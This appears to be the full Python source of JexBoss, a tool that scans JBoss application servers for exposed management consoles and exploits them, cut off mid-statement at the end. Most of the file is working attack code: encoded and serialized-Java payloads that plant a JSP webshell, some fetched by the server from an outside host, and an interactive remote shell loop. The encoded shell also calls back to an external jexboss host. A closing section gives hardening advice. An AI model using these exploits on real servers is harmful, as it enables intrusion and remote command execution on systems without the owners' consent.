#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
JexBoss: Jboss verify and EXploitation Tool
https://github.com/joaomatosf/jexboss

Copyright 2013 João Filho Matos Figueiredo

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'

__author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
__version = "1.0.3"

from sys import argv, exit, version_info

from os import name, system
import os
import shutil
from zipfile import ZipFile
from time import sleep
from random import randint
try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

try:
    from urllib3 import disable_warnings, PoolManager
    from urllib3.util.timeout import Timeout
except ImportError:
    ver = version_info[0] if version_info[0] >= 3 else ""
    print(RED1 + BOLD + "\n * Package urllib3 not installed. Please install the package urllib3 before continue.\n"
                        "" + GREEN + "   Example: \n"
                                     "   # apt-get install python%s-pip ; easy_install%s urllib3\n" % (ver, ver) + ENDC)
    exit(0)

from urllib3 import disable_warnings, PoolManager
from urllib3.util.timeout import Timeout

disable_warnings()

timeout = Timeout(connect=3.0, read=6.0)
pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')

user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
               "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
               "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
               "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
               "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
               "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"]


def get_successfully(url, path):
    """
    Test if a GET to a URL is successful
    :param url: The base URL
    :param path: The URL path
    :return: The HTTP status code
    """
    sleep(5)
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
    r = pool.request('GET', url + path, redirect=False, headers=headers)
    result = r.status
    if result == 404:
        sleep(7)
        r = pool.request('GET', url + path, redirect=False, headers=headers)
        result = r.status
    return result


def check_vul(url):
    """
    Test if a GET to a URL is successful
    :param url: The URL to test
    :return: A dict with the exploit type as the keys, and the HTTP status code as the value
    """
    print(GREEN + " ** Checking Host: %s **\n" % url)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

    paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
             "web-console" 	: "/web-console/ServerInfo.jsp",
             "JMXInvokerServlet": "/invoker/JMXInvokerServlet"}

    for i in paths.keys():
        try:
            print(GREEN + " * Checking %s: \t" % i + ENDC),
            r = pool.request('HEAD', url +str(paths[i]), redirect=False, headers=headers)
            paths[i] = r.status
            if paths[i] in (301, 302, 303, 307, 308):
                url_redirect = r.get_redirect_location()
                print(GREEN + "[ REDIRECT ]\n * The server sent a redirect to: %s\n" % url_redirect)
            elif paths[i] == 200 or paths[i] == 500:
                print(RED + "[ VULNERABLE ]" + ENDC)
            else:
                print(GREEN + "[ OK ]")
        except:
            print(RED + "\n * An error occurred while connecting to the host %s\n" % url + ENDC)
            paths[i] = 505

    return paths


def auto_exploit(url, exploit_type):
    """
    Automatically exploit a URL
    :param url: The URL to exploit
    :param exploit_type: One of the following
    exploitJmxConsoleFileRepository: tested and working in JBoss 4 and 5
    exploitJmxConsoleMainDeploy:	 tested and working in JBoss 4 and 6
    exploitWebConsoleInvoker:		 tested and working in JBoss 4
    exploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5
    """
    print(GREEN + "\n * Sending exploit code to %s. Please wait...\n" % url)
    result = 505
    if exploit_type == "jmx-console":
        result = exploit_jmx_console_file_repository(url)
        if result != 200 and result != 500:
            result = exploit_jmx_console_main_deploy(url)
    elif exploit_type == "web-console":
        result = exploit_web_console_invoker(url)
    elif exploit_type == "JMXInvokerServlet":
        result = exploit_jmx_invoker_file_repository(url)

    if result == 200 or result == 500:
        print(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
        shell_http(url, exploit_type)
    else:
        print(RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" +
                    "   Waiting for 7 seconds...\n " + ENDC)
        sleep(7)


def shell_http(url, shell_type):
    """
    Connect to an HTTP shell
    :param url: The URL to connect to
    :param shell_type: The type of shell to connect to
    """
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

    if shell_type == "jmx-console" or shell_type == "web-console":
        path = '/jbossass/jbossass.jsp?'
    elif shell_type == "JMXInvokerServlet":
        path = '/shellinvoker/shellinvoker.jsp?'
        headers['User-Agent'] = "jexboss"

    pool.request('GET', url+ path, redirect=False, headers=headers)

    sleep(7)
    resp = ""
    print(" * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * \n")
    print(RED + " * " + url + ": \n" + ENDC)

    for cmd in ['uname -a', 'cat /etc/issue', 'id']:
        cmd = urlencode({"ppp": cmd})
        r = pool.request('GET', url + path + cmd, redirect=False, headers=headers)
        resp += " " + str(r.data).split(">")[1]
    print(resp.replace('\\n', '\n')),

    while 1:
        print(BLUE + "[Type commands or \"exit\" to finish]")
        cmd = input("Shell> " + ENDC) if version_info[0] >= 3 else raw_input("Shell> " + ENDC)
        if cmd == "exit":
            break

        cmd = urlencode({"ppp": cmd})
        r = pool.request('GET', url + path + cmd, redirect=False, headers=headers)
        resp = str(r.data)
        if r.status == 404:
            print(RED + " * Error contacting the command shell. Try again later...")
            continue
        stdout = ""
        try:
            stdout = resp.split("pre>")[1]
        except:
            print(RED + " * Error contacting the command shell. Try again later...")
        if stdout.count("An exception occurred processing JSP page") == 1:
            print(RED + " * Error executing command \"%s\". " % cmd.split("=")[1] + ENDC)
        else:
            print(stdout.replace('\\n', '\n'))


def exploit_jmx_console_main_deploy(url):
    """
    Exploit MainDeployer to deploy a JSP shell. Does not work in JBoss 5 (bug in JBoss 5).
    /jmx-console/HtmlAdaptor
    :param url: The url to exploit
    :return: The HTTP status code
    """
    jsp = "http://www.joaomatosf.com/rnp/jbossass.war"
    payload = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service"
               "=MainDeployer&methodIndex=19&arg0=" + jsp)
    print(GREEN + "\n * Info: This exploit will force the server to deploy the webshell " +
          "\n   available at: " + jsp + ENDC)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

    r = pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/jbossass/jbossass.jsp")


def exploit_jmx_console_file_repository(url):
    """
    Exploit DeploymentFileRepository to deploy a JSP shell
    Tested and working in JBoss 4, 5. Does not work in JBoss 6.
    /jmx-console/HtmlAdaptor
    :param url: The URL to exploit
    :return: The HTTP status code
    """
    jsp = ("%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61%2E%75"
           "%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%2C%20%6A%61%76%61%2E%6E%65"
           "%74%2E%2A%22%20%70%61%67%65%45%6E%63%6F%64%69%6E%67%3D%22%55%54%46%2D%38"
           "%22%25%3E%3C%70%72%65%3E%3C%25%69%66%20%28%72%65%71%75%65%73%74%2E%67%65"
           "%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%21%3D%20%6E%75%6C"
           "%6C%29%20%7B%55%52%4C%20%75%72%6C%20%3D%20%6E%65%77%20%55%52%4C%28%22%68"
           "%74%74%70%3A%2F%2F%77%65%62%73%68%65%6C%6C%2E%6A%65%78%62%6F%73%73%2E%6E"
           "%65%74%2F%22%29%3B%20%48%74%74%70%55%52%4C%43%6F%6E%6E%65%63%74%69%6F%6E"
           "%20%63%68%65%63%6B%20%3D%20%28%48%74%74%70%55%52%4C%43%6F%6E%6E%65%63%74"
           "%69%6F%6E%29%20%75%72%6C%2E%6F%70%65%6E%43%6F%6E%6E%65%63%74%69%6F%6E%28"
           "%29%3B%63%68%65%63%6B%2E%73%65%74%52%65%71%75%65%73%74%50%72%6F%70%65%72"
           "%74%79%28%22%55%73%65%72%2D%41%67%65%6E%74%22%2C%20%72%65%71%75%65%73%74"
           "%2E%67%65%74%52%65%6D%6F%74%65%41%64%64%72%28%29%29%3B%53%74%72%69%6E%67"
           "%20%77%72%69%74%65%70%65%72%6D%69%73%73%69%6F%6E%20%3D%20%28%6E%65%77%20"
           "%44%61%74%65%28%29%2E%74%6F%53%74%72%69%6E%67%28%29%2E%73%70%6C%69%74%28"
           "%22%3A%22%29%5B%30%5D%2B%22%68%2E%6C%6F%67%22%29%2E%72%65%70%6C%61%63%65"
           "%41%6C%6C%28%22%20%22%2C%20%22%2D%22%29%3B%20%53%74%72%69%6E%67%20%73%68"
           "%5B%5D%20%3D%20%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65"
           "%72%28%22%70%70%70%22%29%2E%73%70%6C%69%74%28%22%20%22%29%3B%69%66%20%28"
           "%21%6E%65%77%20%46%69%6C%65%28%22%63%68%65%63%6B%5F%22%2B%77%72%69%74%65"
           "%70%65%72%6D%69%73%73%69%6F%6E%29%2E%65%78%69%73%74%73%28%29%29%7B%20%50"
           "%72%69%6E%74%57%72%69%74%65%72%20%77%72%69%74%65%72%20%3D%20%6E%65%77%20"
           "%50%72%69%6E%74%57%72%69%74%65%72%28%22%63%68%65%63%6B%5F%22%2B%77%72%69"
           "%74%65%70%65%72%6D%69%73%73%69%6F%6E%29%3B%20%63%68%65%63%6B%2E%67%65%74"
           "%49%6E%70%75%74%53%74%72%65%61%6D%28%29%3B%77%72%69%74%65%72%2E%63%6C%6F"
           "%73%65%28%29%3B%20%7D%20%65%6C%73%65%20%69%66%20%28%73%68%5B%30%5D%2E%63"
           "%6F%6E%74%61%69%6E%73%28%22%69%64%22%29%20%7C%7C%20%73%68%5B%30%5D%2E%63"
           "%6F%6E%74%61%69%6E%73%28%22%69%70%63%6F%6E%66%69%67%22%29%29%20%63%68%65"
           "%63%6B%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%3B%20%74%72%79"
           "%20%7B%20%50%72%6F%63%65%73%73%20%70%3B%20%69%66%20%28%53%79%73%74%65%6D"
           "%2E%67%65%74%50%72%6F%70%65%72%74%79%28%22%6F%73%2E%6E%61%6D%65%22%29%2E"
           "%74%6F%4C%6F%77%65%72%43%61%73%65%28%29%2E%69%6E%64%65%78%4F%66%28%22%77"
           "%69%6E%22%29%20%3E%20%30%29%7B%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65"
           "%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%63%6D%64%2E%65%78%65"
           "%20%2F%63%20%22%2B%73%68%29%3B%20%7D%20%65%6C%73%65%20%7B%70%20%3D%20%52"
           "%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63"
           "%28%73%68%29%3B%7D%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%64%20"
           "%3D%20%6E%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6E%65%77"
           "%20%49%6E%70%75%74%53%74%72%65%61%6D%52%65%61%64%65%72%28%70%2E%67%65%74"
           "%49%6E%70%75%74%53%74%72%65%61%6D%28%29%29%29%3B%20%53%74%72%69%6E%67%20"
           "%64%69%73%72%20%3D%20%64%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%77%68%69"
           "%6C%65%28%64%69%73%72%20%21%3D%20%6E%75%6C%6C%29%20%7B%6F%75%74%2E%70%72"
           "%69%6E%74%6C%6E%28%64%69%73%72%29%3B%64%69%73%72%20%3D%20%64%2E%72%65%61"
           "%64%4C%69%6E%65%28%29%3B%7D%7D%63%61%74%63%68%28%45%78%63%65%70%74%69%6F"
           "%6E%20%65%29%7B%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%22%55%6E%6B%6E%6F%77"
           "%6E%20%63%6F%6D%6D%61%6E%64%2E%22%29%3B%7D%7D%25%3E")

    payload = ("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="
               "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="
               "jbossass.war&argType=java.lang.String&arg1=jbossass&argType=java.lang.St"
               "ring&arg2=.jsp&argType=java.lang.String&arg3=" + jsp + "&argType=boolean&arg4=True")

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
    pool.request('HEAD', url + payload, redirect=False, headers=headers)
    return get_successfully(url, "/jbossass/jbossass.jsp")


def exploit_jmx_invoker_file_repository(url):
    """
    Exploits the JMX invoker
    tested and works in JBoss 4, 5
    MainDeploy, shell in data
    # /invoker/JMXInvokerServlet
    :param url: The URL to exploit
    :return:
    """
    payload = ("\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73"
               "\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72"
               "\x73\x68\x61\x6c\x6c\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f"
               "\x6e\xf6\x06\x95\x27\x41\x3e\xa4\xbe\x0c\x00\x00\x78\x70\x70\x77"
               "\x08\x78\x94\x98\x47\xc1\xd0\x53\x87\x73\x72\x00\x11\x6a\x61\x76"
               "\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2"
               "\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75"
               "\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e"
               "\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00"
               "\x78\x70\xe3\x2c\x60\xe6\x73\x72\x00\x24\x6f\x72\x67\x2e\x6a\x62"
               "\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d"
               "\x61\x72\x73\x68\x61\x6c\x6c\x65\x64\x56\x61\x6c\x75\x65\xea\xcc"
               "\xe0\xd1\xf4\x4a\xd0\x99\x0c\x00\x00\x78\x70\x7a\x00\x00\x02\xc6"
               "\x00\x00\x02\xbe\xac\xed\x00\x05\x75\x72\x00\x13\x5b\x4c\x6a\x61"
               "\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90"
               "\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x04"
               "\x73\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65"
               "\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f"
               "\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x2c\x6a"
               "\x62\x6f\x73\x73\x2e\x61\x64\x6d\x69\x6e\x3a\x73\x65\x72\x76\x69"
               "\x63\x65\x3d\x44\x65\x70\x6c\x6f\x79\x6d\x65\x6e\x74\x46\x69\x6c"
               "\x65\x52\x65\x70\x6f\x73\x69\x74\x6f\x72\x79\x78\x74\x00\x05\x73"
               "\x74\x6f\x72\x65\x75\x71\x00\x7e\x00\x00\x00\x00\x00\x05\x74\x00"
               "\x10\x73\x68\x65\x6c\x6c\x69\x6e\x76\x6f\x6b\x65\x72\x2e\x77\x61"
               "\x72\x74\x00\x0c\x73\x68\x65\x6c\x6c\x69\x6e\x76\x6f\x6b\x65\x72"
               "\x74\x00\x04\x2e\x6a\x73\x70\x74\x01\x79\x3c\x25\x40\x20\x70\x61"
               "\x67\x65\x20\x69\x6d\x70\x6f\x72\x74\x3d\x22\x6a\x61\x76\x61\x2e"
               "\x75\x74\x69\x6c\x2e\x2a\x2c\x6a\x61\x76\x61\x2e\x69\x6f\x2e\x2a"
               "\x22\x25\x3e\x3c\x70\x72\x65\x3e\x3c\x25\x69\x66\x28\x72\x65\x71"
               "\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61\x72\x61\x6d\x65\x74\x65"
               "\x72\x28\x22\x70\x70\x70\x22\x29\x20\x21\x3d\x20\x6e\x75\x6c\x6c"
               "\x20\x26\x26\x20\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x48"
               "\x65\x61\x64\x65\x72\x28\x22\x75\x73\x65\x72\x2d\x61\x67\x65\x6e"
               "\x74\x22\x29\x2e\x65\x71\x75\x61\x6c\x73\x28\x22\x6a\x65\x78\x62"
               "\x6f\x73\x73\x22\x29\x20\x29\x20\x7b\x20\x50\x72\x6f\x63\x65\x73"
               "\x73\x20\x70\x20\x3d\x20\x52\x75\x6e\x74\x69\x6d\x65\x2e\x67\x65"
               "\x74\x52\x75\x6e\x74\x69\x6d\x65\x28\x29\x2e\x65\x78\x65\x63\x28"
               "\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61\x72\x61\x6d"
               "\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x29\x3b\x20\x44\x61"
               "\x74\x61\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x20\x64\x69"
               "\x73\x20\x3d\x20\x6e\x65\x77\x20\x44\x61\x74\x61\x49\x6e\x70\x75"
               "\x74\x53\x74\x72\x65\x61\x6d\x28\x70\x2e\x67\x65\x74\x49\x6e\x70"
               "\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x29\x29\x3b\x20\x53\x74\x72"
               "\x69\x6e\x67\x20\x64\x69\x73\x72\x20\x3d\x20\x64\x69\x73\x2e\x72"
               "\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20\x77\x68\x69\x6c\x65"
               "\x20\x28\x20\x64\x69\x73\x72\x20\x21\x3d\x20\x6e\x75\x6c\x6c\x20"
               "\x29\x20\x7b\x20\x6f\x75\x74\x2e\x70\x72\x69\x6e\x74\x6c\x6e\x28"
               "\x64\x69\x73\x72\x29\x3b\x20\x64\x69\x73\x72\x20\x3d\x20\x64\x69"
               "\x73\x2e\x72\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20\x7d\x20"
               "\x7d\x25\x3e\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67"
               "\x2e\x42\x6f\x6f\x6c\x65\x61\x6e\xcd\x20\x72\x80\xd5\x9c\xfa\xee"
               "\x02\x00\x01\x5a\x00\x05\x76\x61\x6c\x75\x65\x78\x70\x01\x75\x72"
               "\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74"
               "\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00"
               "\x78\x70\x00\x00\x00\x05\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61"
               "\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x71\x00\x7e\x00\x0f\x71\x00"
               "\x7e\x00\x0f\x71\x00\x7e\x00\x0f\x74\x00\x07\x62\x6f\x6f\x6c\x65"
               "\x61\x6e\x63\x79\xb8\x87\x78\x77\x08\x00\x00\x00\x00\x00\x00\x00"
               "\x01\x73\x72\x00\x22\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69"
               "\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x49\x6e\x76\x6f\x63\x61"
               "\x74\x69\x6f\x6e\x4b\x65\x79\xb8\xfb\x72\x84\xd7\x93\x85\xf9\x02"
               "\x00\x01\x49\x00\x07\x6f\x72\x64\x69\x6e\x61\x6c\x78\x70\x00\x00"
               "\x00\x04\x70\x78")



    headers = {"Content-Type": "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
               "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

    r = pool.urlopen('POST', url + "/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
    result = r.status
    if result == 401:
        print("   Retrying...")
    pool.urlopen('HEAD', url + "/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
    return get_successfully(url, "/shellinvoker/shellinvoker.jsp")


def exploit_web_console_invoker(url):
    """
    Exploits web console invoker
    Does not work in JBoss 5 (bug in JBoss5)
    :param url: The URL to exploit
    :return: The HTTP status code
    """
    payload = ("\xac\xed\x00\x05\x73\x72\x00\x2e\x6f\x72\x67\x2e"
               "\x6a\x62\x6f\x73\x73\x2e\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x72\x65"
               "\x6d\x6f\x74\x65\x2e\x52\x65\x6d\x6f\x74\x65\x4d\x42\x65\x61\x6e"
               "\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xe0\x4f\xa3\x7a\x74\xae"
               "\x8d\xfa\x02\x00\x04\x4c\x00\x0a\x61\x63\x74\x69\x6f\x6e\x4e\x61"
               "\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f"
               "\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x06\x70\x61\x72\x61\x6d\x73"
               "\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f"
               "\x62\x6a\x65\x63\x74\x3b\x5b\x00\x09\x73\x69\x67\x6e\x61\x74\x75"
               "\x72\x65\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67"
               "\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x10\x74\x61\x72\x67\x65"
               "\x74\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x74\x00\x1d\x4c\x6a"
               "\x61\x76\x61\x78\x2f\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2f"
               "\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x3b\x78\x70\x74\x00\x06"
               "\x64\x65\x70\x6c\x6f\x79\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61"
               "\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58"
               "\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00"
               "\x2a"
               # link
               "\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x6a\x6f\x61\x6f\x6d\x61"
               "\x74\x6f\x73\x66\x2e\x63\x6f\x6d\x2f\x72\x6e\x70\x2f\x6a\x62\x6f"
               "\x73\x73\x61\x73\x73\x2e\x77\x61\x72"
               # end
               "\x75\x72\x00\x13\x5b"
               "\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e"
               "\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00"
               "\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e"
               "\x53\x74\x72\x69\x6e\x67\x73\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e"
               "\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63"
               "\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00"
               "\x78\x70\x74\x00\x21\x6a\x62\x6f\x73\x73\x2e\x73\x79\x73\x74\x65"
               "\x6d\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65"
               "\x70\x6c\x6f\x79\x65\x72\x78")

    headers = {
        "Content-Type": "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
        "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
        "Connection": "keep-alive",
        "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
    r = pool.urlopen('POST', url + "/web-console/Invoker", redirect=False, headers=headers, body=payload)
    result = r.status
    if result == 401:
        print("   Retrying...")
    pool.urlopen('HEAD', url + "/web-console/Invoker", redirect=False, headers=headers, body=payload)
    return get_successfully(url, "/jbossass/jbossass.jsp")


def clear():
    """
    Clears the console
    """
    if name == 'posix':
        system('clear')
    elif name == ('ce', 'nt', 'dos'):
        system('cls')


def check_args(args):
    """
    Check the command-line arguments
    :param args: The arguments to check
    :returns: Exit code, message
    """
    if len(args) < 2 or args[1].count('.') < 1:
        return 1, "You must provide the host name or IP address you want to test."
    else:
        return 0, ""


def banner():
    """
    Print the banner
    """
    clear()
    print(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
                 " |                                                      |\n"
                 " | @author:  João Filho Matos Figueiredo                |\n"
                 " | @contact: joaomatosf@gmail.com                       |\n"
                 " |                                                      |\n"
                 " | @update: https://github.com/joaomatosf/jexboss       |\n"
                 " #______________________________________________________#\n")
    print(RED1 + " @version: %s\n"%__version)

def main():
    """
    Run interactively. Call when the module is run by itself.
    :return: Exit code
    """
    # check for Updates
    updates = check_updates()
    if updates:
        print(BLUE + BOLD + "\n\n * An update is available and is recommended update before continuing.\n" +
              "   Do you want to update now?")
        pick = input("   YES/no ? ").lower() if version_info[0] >= 3 else raw_input("   YES/no ? ").lower()
        print (ENDC)
        if pick != "no":
            updated = auto_update()
            if updates:
                print(GREEN + BOLD + "\n * The JexBoss has been successfully updated. Please run again to enjoy the updates.\n" +ENDC)
                exit(0)
            else:
                print(RED + BOLD + "\n\n * An error occurred while updating the JexBoss. Please try again..\n" +ENDC)
                exit(1)
    # check Args
    status, message = check_args(argv)
    if status == 0:
        url = argv[1]
    elif status == 1:
        print(RED + "\n * Error: %s" % message)
        print(BLUE + "\n Example:\n python %s https://site.com.br\n" % argv[0] + ENDC)
        exit(status)

    # check vulnerabilities
    scan_results = check_vul(url)

    # performs exploitation
    for i in ["jmx-console", "web-console", "JMXInvokerServlet"]:
        if scan_results[i] == 200 or scan_results[i] == 500:
            print(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
                  BOLD + i + NORMAL + "\" ?\n" +
                  "   This operation will provide a simple command shell to execute commands on the server..\n" +
                  RED + "   Continue only if you have permission!" + ENDC)
            pick = input("   yes/NO ? ").lower() if version_info[0] >= 3 else raw_input("   yes/NO ? ").lower()
            if pick == "yes":
                auto_exploit(url, i)

    # resume results
    if list(scan_results.values()).count(200) > 0:
        banner()
        print(RED + BOLD+" Results: potentially compromised server!" + ENDC)
        print(GREEN + " * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n"
             +BOLD+   " Recommendations: \n" +ENDC+
              GREEN+  " - Remove web consoles and services that are not used, eg:\n"
                      "    $ rm web-console.war\n"
                      "    $ rm http-invoker.sar\n"
                      "    $ rm jmx-console.war\n"
                      "    $ rm jmx-invoker-adaptor-server.sar\n"
                      "    $ rm admin-console.war\n"
                      " - Use a reverse proxy (eg. nginx, apache, F5)\n"
                      " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
                      " - Search vestiges of exploitation within the directories \"deploy\" and \"management\".\n\n"
                      " References:\n"
                      "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                      "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
                      "\n"
                      " - If possible, discard this server!\n"
                      " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n")
    elif list(scan_results.values()).count(505) == 0:
        print(GREEN + "\n\n * Results: \n" +
              "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
    # infos
    print(ENDC + " * Info: review, suggestions, updates, etc: \n" +
          "   https://github.com/joaomatosf/jexboss\n")

    print(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n"
                                                "           including research to new versions of JBoss and zero days. \n\n" +
